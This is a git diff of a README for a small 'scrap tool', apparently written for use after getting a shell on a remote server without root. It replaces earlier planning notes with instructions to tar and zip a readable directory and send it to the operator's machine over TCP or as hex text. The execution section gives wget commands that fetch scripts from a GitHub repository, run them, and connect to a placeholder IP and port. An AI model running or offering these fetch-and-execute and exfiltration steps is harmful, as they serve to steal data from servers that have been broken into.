@@ -1,16 +1,22 @@
-# approaches
-##(bash)
-1- those scripts are supposed to serialize everything under given directory, package, zip, then translate it to hex form to be read through the browser.
-##python
-2- open TCP connection to my local machine, and transfer everything.
+# scrap tool
 
-#2
-- I can write any where except under /root
-- can i update the current ipynb? if so then i can append the content, and copy it, but better than this to copy large amount of data is transfering it through TCP.
-- even wget is installed, so i need to publish the client in python online, as well as setup bash script, and wget setup script, and run it, to download and execute the python script.
-- in all cases the ip isn't known, therefore i need to run the client on the target machine.
-- to keep the directory tree, tar, and zip the whole given path.
-- the py script expect to read a file /tmp/scrub.tar.zip
+## purpose
+- this tool is intended to be executed after you drop a shell in a remote server, but without root permissions, or in the scenario when there is no tools such as scp.
 
-#1
-- But there is a problem, i can't write any file! but i may execute the script from a string at the terminal.
+## instructions
+- tar, and zip given, and readable directory.
+- send it to public, or local machine.
+
+
+##strategies
+- those scripts are supposed to package everything under given directory, zip, then translate it to hex form to be read through the browser.
+- open TCP connection to my local machine, and transfer everything.
+
+## execution
+wget raw.githubusercontent.com/ertosns/scrap/main/scrap.sh
+bash scrap.sh
+wget raw.githubusercontent.com/ertosns/scrap/main/rscrap.py
+python3 ./rscrap.py -t c -a {IP} -p {PORT}
+
+## notes
+- if case you don't know the ip of the target machine you have to set your router to 'port forward' the port set in the local server.
